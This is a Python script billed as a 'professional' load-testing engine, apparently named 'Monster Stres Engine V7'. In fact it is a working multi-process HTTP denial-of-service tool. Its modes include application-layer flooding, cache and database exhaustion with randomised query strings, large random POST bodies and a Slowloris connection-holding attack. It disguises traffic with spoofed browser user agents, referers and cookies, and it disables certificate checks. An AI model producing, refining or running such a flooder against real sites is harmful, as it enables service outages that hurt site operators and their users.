import sys
import multiprocessing
import time
import random
import string
import socket
import ssl

# Monster Stres Engine V7 (WRK-Style Performance Overhaul)
# Professional Grade Load Testing Engine - Optimized for Efficacy

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://www.facebook.com/", "https://twitter.com/", "https://yandex.com/"
]

ENC_POOL = ["gzip, deflate, br", "identity", "*", "gzip", "compress, gzip"]
LANG_POOL = ["en-US,en;q=0.9", "id-ID,id;q=0.8,en-US;q=0.7,en;q=0.6", "en-GB,en;q=0.5"]

def get_random_string(length=8):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err):
    try:
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        host = parsed.netloc
        path = parsed.path if parsed.path else "/"
        scheme = parsed.scheme
    except:
        host, path, scheme = target_url, "/", "http"

    target_port = int(port) if port else (443 if scheme == 'https' else 80)
    RANDOM_POOL = [get_random_string(16) for _ in range(200)]
    
    while time.time() < end_time:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Reduce latency
            s.settimeout(3)
            
            if scheme == 'https' or target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            
            s.connect((host, target_port))

            # PIPELINING LOOP
            # Reuse socket for 100 requests to maximize throughput (WRK Style)
            for _ in range(100):
                if time.time() >= end_time: break
                
                curr_path = path
                method = "GET"
                post_data = ""
                
                # Mode 3, 4: Advanced Cache Bypass
                if mode in ['3', '4']:
                    rnd = RANDOM_POOL[random.randint(0, 199)]
                    sep = '&' if '?' in curr_path else '?'
                    curr_path = f"{path}{sep}sb={rnd}&hash={get_random_string(8)}&t={int(time.time())}"

                # Mode 4: Killer V7 Logic
                if mode == '4' and random.random() > 0.3:
                    method = "POST"
                    post_data = get_random_string(random.randint(10000, 40000))
                
                # Mode 5: Slowloris Logic
                if mode == '5':
                    payload = f"GET {curr_path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n"
                    s.sendall(payload.encode('utf-8'))
                    while time.time() < end_time:
                        time.sleep(8)
                        # Keep drip feeding to hold connection
                        s.sendall(f"X-H: {random.randint(1,99)}\r\n".encode('utf-8'))
                        with shared_req.get_lock(): shared_req.value += 1
                    break

                # Build Headers with higher entropy
                headers = (
                    f"{method} {curr_path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Referer: {random.choice(REFERERS)}\r\n"
                    f"Accept-Encoding: {random.choice(ENC_POOL)}\r\n"
                    f"Accept-Language: {random.choice(LANG_POOL)}\r\n"
                    f"If-None-Match: \"{get_random_string(10)}\"\r\n"
                    f"Cookie: _ga=GA1.1.{random.randint(100,999)}.{random.randint(100,999)}; sess={get_random_string(16)}\r\n"
                    "Connection: keep-alive\r\n"
                    "Cache-Control: no-cache, no-store, must-revalidate\r\n"
                    "Pragma: no-cache\r\n"
                )
                
                if method == "POST":
                    headers += f"Content-Length: {len(post_data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{post_data}"
                else:
                    headers += "\r\n"

                payload = headers.encode('utf-8')
                s.sendall(payload)
                
                # UPDATE STATS
                with shared_req.get_lock(): shared_req.value += 1
                with shared_bytes.get_lock(): shared_bytes.value += len(payload)

                # NON-BLOCKING READ & DISCARD (The WRK Trick)
                # This clears the socket buffer so the server doesn't throttle us
                try:
                    s.setblocking(False)
                    data = s.recv(4096)
                    if data:
                        with shared_bytes.get_lock(): shared_bytes.value += len(data)
                except (BlockingIOError, socket.timeout):
                    pass # Nothing to read yet
                finally:
                    s.setblocking(True)

        except Exception as e:
            with shared_err.get_lock(): shared_err.value += 1
        finally:
            if s: 
                try: s.close()
                except: pass

def main():
    if len(sys.argv) < 6: sys.exit(1)
    url, th_count, duration, port, mode = sys.argv[1:6]
    th_count, duration = int(th_count), int(duration)
    if not url.startswith('http'): url = 'http://' + url

    shared_req = multiprocessing.Value('i', 0)
    shared_bytes = multiprocessing.Value('L', 0) # Track sent + recv
    shared_err = multiprocessing.Value('i', 0)

    mode_name = {
        '1': "L7 APPLICATION FLOOD", '2': "HUMAN IDENTITY EMULATION",
        '3': "CACHE & DB EXHAUSTION", '4': "KILLER V7 (WRK-MODE)",
        '5': "SLOWLORIS (CONN EXHAUSTION)"
    }.get(mode, "UNKNOWN")

    print(f"[*] DEPLOYING MONSTER V7 - WRK PERFORMANCE OVERHAUL")
    print(f"[*] TARGET: {url}\n[*] PROTOCOL: {mode_name}\n[*] WORKERS: {th_count}\n" + "-"*40)
    sys.stdout.flush()

    end_time = time.time() + duration
    processes = [multiprocessing.Process(target=attack_proc, args=(url, end_time, port, mode, shared_req, shared_bytes, shared_err)) for _ in range(th_count)]
    for p in processes: p.daemon = True; p.start()

    start_time = time.time()
    last_bytes = 0
    while time.time() < end_time:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        curr_bytes = shared_bytes.value
        mbps = ((curr_bytes - last_bytes) * 8) / (1024 * 1024)
        last_bytes = curr_bytes
        print(f"PROGRESS:{elapsed}:{duration} | REQ: {shared_req.value} | THROUGHPUT: {mbps:.2f} Mbps | ERRORS: {shared_err.value}")
        sys.stdout.flush()

    for p in processes: p.terminate()
    print("-" * 40 + "\n[*] OPERATION COMPLETED.")

if __name__ == "__main__":
    main()
